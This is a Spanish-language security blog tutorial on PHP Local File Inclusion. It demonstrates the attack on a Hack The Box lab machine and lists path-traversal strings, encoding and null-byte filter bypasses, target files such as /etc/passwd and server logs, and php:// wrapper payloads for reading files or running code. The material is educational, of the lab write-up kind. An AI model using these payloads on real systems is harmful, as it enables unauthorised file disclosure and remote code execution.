---
title: Local File Inclusion (LFI)
author:
date: 14-03-2023
categories: [Hacking Web]
tags: [LFI, File Inclusion,Wrappers]
pin: false
image:
  path: /assets/img/commons/LFI/LFI.png
  alt: LFI 
---

- Otra de las vulnerabilidades que estan muy presentes hoy en día es el famoso LFI que por sus siglas quiere decir (Local File Inclusion) Inclusión de archivos Locales, pero...Que quiere decir esto realmente? a continuación explicaré de que trata la vulnerabilidad, en donde se acontece  y como podemos explotar para aprovecharnos de un LFI

## LFI Definition 
la inclusión de archivos locales es una técnica muy usada para engañar a una aplicación web para que exponga archivos en un servidor web, pueden mostrar información confidencial que este guardada en la máquina del servidor, incluso se puede derivar una ejecución remota de código (RCE) aprovechandosé de algunos logs del sistema a esta otra técnica se le llama **logPoisoning** que despés explicaré y traeré en mi blog, El LFI esta documentada y puesta en las 10 principales vulnerabilidades de OWASP.
Si el sitio web interpreta PHP o algún otro lenguaje del lado del servidor, podemos incluir código malicioso en el archivo local y ejecutarlo en el servidor

Cabe mencionar que aunque la interpretación de PHP es uno de los escenarios más comunes para las vulnerabilidades de LFI, también es posible que otras tecnologías, como ASP.NET, JSP, Ruby on Rails, etc.

## Code vunlerability 
a continuación muestro el código de php que es vulnerable a LFI, vemos que con el include hace una petición por GET se incluye: GET pasa los datos por URL a donde se apunta y se aloja el servidor
```php
<?php
include $_GET[‘page’];
?>
```
pdriamos cambiar esto a 

```php
<?php
include(‘page.php’);
?>
```
se necesita poder modificar los parámetros de lo que se va a incluir; el código no vulnerable anteriormente mostrado, include(‘page.php’), no es vulnerable a LFI porque no hay nada que pueda modificar, ya que nada más se incluyepapage.php. 

## LFI exploitation
Lo veremos mas claro con esta máquina de hack the box que es vulnerable a LFI, anteriormente expliqué lo que es y en donde se acontoce esta vulnerabilidad. Supongamos que estamos auditando un sitio web y al inspeccionar el código fuente del sistema vemos que a la llamada de una búsqueda incluye el método GET

![](/assets/img/commons/LFI/web.png)

ahora si en el sitio web probamos hacer una busqueda como test vemos lo siguiente

![](/assets/img/commons/LFI/web1.png)

![](/assets/img/commons/LFI/web2.png)

observamos que en la URL esta incluyendo file apuntando a un recurso del servidor en este caso como en el server no esta "test" me saldrá el error **include(): Failed opening 'test' for inclusion (include_path='.:/usr/local/www/apache24/data')**

```console
http://10.10.10.84/browse.php?file=test
```
perooo que pasaría si apuntamos a un archivo existente en caso de que en el server se maneje en  linux apuntar al /etc/passwd

```console
http://10.10.10.84/browse.php?file=/etc/passwd
```
![](/assets/img/commons/LFI/web3.png)

si lo vemos de una manera mas ordenada con Ctrl + U para ver el código fuente 

![](/assets/img/commons/LFI/web4.png)

nos muestra los usuarios que estan definidos en el sistema (el /etc/passwd almacena todos los nombres de usuario y cuentas en el sistema Linux.) al igual podemos enviar con curl la petición directamente y ver mas comodo el contenido

![](/assets/img/commons/LFI/terminal.png)

pueden existir otro parametros aparte del include:
- include 
- requiere 
- include_once
- requiere_once
no siempre se puede visualizar un archivo directamente eso me lleva al siguiente punto

## Directory Path Traversal
esta es un ténica que permite escapar de una ruta a la que se nos esta obligando permanecer, esta técnica se lleva acabo a través del uso de dot-dot-slash dicho de otra forma **../**, por ejemplo si queremos acceder igual al /etc/passwd y lo ponemos directamente no cargará porque la ruta actual del servidor donde esta colocado es /var/www/html/ y estaria buscando en /var/www/html/etc/host que esa ruta no existe sin embargo a la hora de hacer el path traversal sería **../../../../../../etc/passwd** para retroceder unos cuantos directorios y me lleve hasta la raiz del sistema, (no necesitamos saber cuantos directorios son exactamente ya que cuando lleguemos a la raiz simplemente se quedará en ese lugar por mucho que vayamos hacia atrás)
nos quedará de la siguiente forma
```console
http://10.10.10.84/browse.php?file=../../../../../../../../etc/passwd 
```
![](/assets/img/commons/LFI/web5.png)

vemos que de igual forma nos carga el /etc/passwd, no es el único archivo al cual se puede apuntar practicamente podemos apuntar al que deseemos si conocemos la estructura de los directorios en Linux.

## File inclusion 

- /proc/sched_debug -> enumera procesos en ejecución
- /proc/net/fib_trie -> muestra interfaces de red 
- /proc/net/tcp -> puertos internos abiertos de la máquina
- /proc/self/environ -> se puede aprovechar manipulando el User Agent del parámetro con Burp. Después de que se haya introducido  código PHP

Por eso es necesario hacer un buen reconocimiento porque si el servidor emplea nginx se podría apuntar a sus archivos de configración como /etc/nginx/nginx.conf, solo basta con buscar las rutas por defecto en donde alamcenan archivos de configuración. 
Tambié se podría apuntar a archivos de bases de datos, configuraciones del servidor como en php, apache y logs del sistema que es donde se puede acontener un RCE envenenado los Logs con inyección en php

**Logs**
- Apache :  /var/log/apache2/access.log
- SSH :  /var/log/auth.log
- SMTP : /var/log/mail.log
- FTP : /var/log/vsftpd.log
(Esta explotación la traré después)

## Bypassing PHP via NULL Byte
esta ténica es un poco antigua ya que funcionaba hasta la versión 5.3.4 de PHP, La inyección de bytes nulos evita el filtrado de aplicaciones dentro de las aplicaciones web al agregar "bytes nulos" codificados en URL, como %00. Por lo general, esto pasa por alto los filtros básicos de la lista negra de aplicaciones web al agregar caracteres nulos adicionales Un ejempl sería el siguiente:
```console
browse.php?page=/etc/passwd%00

browse.php?page=/etc/passwd%2500 
```
## Bypassing Filters in LFI 
no siempre se consigue de tal forma un LFI a la hora de hacer el típico path traversal, por detrás puede haber codigo sanitizando esta función 
**Double encoding**
```console
http://test.com/browse.php?page=%252e%252e%252fetc%252fpasswd
http://test.com/browse.php?page=%252e%252e%252fetc%252fpasswd%00
```
**UTF-8 encodig**
```console
http://test.com/browse.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://test.com/browse.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```
**Basic Exploitation**
```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```
jugar con dote-slash ../ de diferentes maneras se pueden evitar algunos filtros de seguridad implmentados en un sistema

**16 bits Unicode encoding**
```console
. = %u002e
/ = %u2215
\ = %u2216
```
**UTF-8 Unicode encoding**
```console
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```
Otra técnica muy común es implementar el doble slash añadiendo doble punto ya que por detrás pueden implmentar una función que elimine la barra / y el .. para eso se le agrega doble para que elimine los primero caracterés y se incluyan los agregados
```console
http://10.10.10.84/browse.php?file=....//....//....//....//....//....//....//....//....//etc/passwd
```
```console
..././
...\.\
```
## Wrappers
un Wrapper es una especie de envoltura que se le dará la secuencia de entrada y salida de datos, esto es muy util en ataques a php como en el LFI y el XXE podemos obtener ventajas a la hora de llamar a la función que queremos que haga

- php://filter
- zip://
- data://
- php://input

**://filter**
el Wrapper filter es de los mas utilizados nos permite encodear la data que trasmitimos y que no podamos leer en un formato formal, por ejemplo volvamos a nuestra máquina vulnerable
en caso de que mi output no me saliera nada al tratar de leer el /etc/passwd podemos ejecutar lo siguiente
```console
http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
```
![](/assets/img/commons/LFI/web6.png)

la data me la envía en base64 ahora para mas comodida enviaré la misma data por curl pero haciendo su proceso inverso para que me representa la data correcta

![](/assets/img/commons/LFI/terminal1.png)

**://zip**
nos permite ejecutar un archivo php que hayamos metido dentro de un archivo zip. 

**://data**
El wrapper data  permite incluir código externo, como puede ser en php. si esta habilitado el allow_url_include podemos abusar con este wrapper y podemos hacerlo de dos formas:

- plain text
- base64 

En texto plano, simplemente tendríamos que usar el siguiente payload:
```console
data:text/plain,<código PHP>
```

**://input**
es parecido al anterior solo que aquí tramitamos una petición por post
```bash
curl -s -X POST -d ‘<código PHP>’ ‘http://example.com/index.php?file=php://input
```
Para ver mas a detalle otras técnicas de como explotar un LFI recomiendo mucho [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion]) y [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
